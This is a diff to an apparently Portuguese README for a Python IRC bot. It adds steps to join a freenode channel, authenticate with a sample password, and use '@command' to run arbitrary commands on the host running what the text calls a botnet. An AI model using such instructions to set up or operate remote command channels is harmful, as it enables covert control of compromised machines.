@@ -29,4 +29,15 @@ módulos: <b>socket, os, time, re</b><br>
 ***Relatar BUGS*** <br>
 Enviar um E-Mail para:<br>
 	marcosrodriguesdecarvalho@gmail.com<br>
- 
+
+***IRC***
+Como usar as propriedades do bot no irc
+
+1º) Acessar a rede freenode.net
+	<b>/connect</b>freenode.net
+2º) Acessar o canal que esta definido do programa
+	<b>/join</b>  #canal
+3º) Realizar a autenticação
+	<b>@ligar</b> senha1234
+3º) Executar qualquer comando no servidor que esta rodando o botnet
+	<b>@command</b> clear 
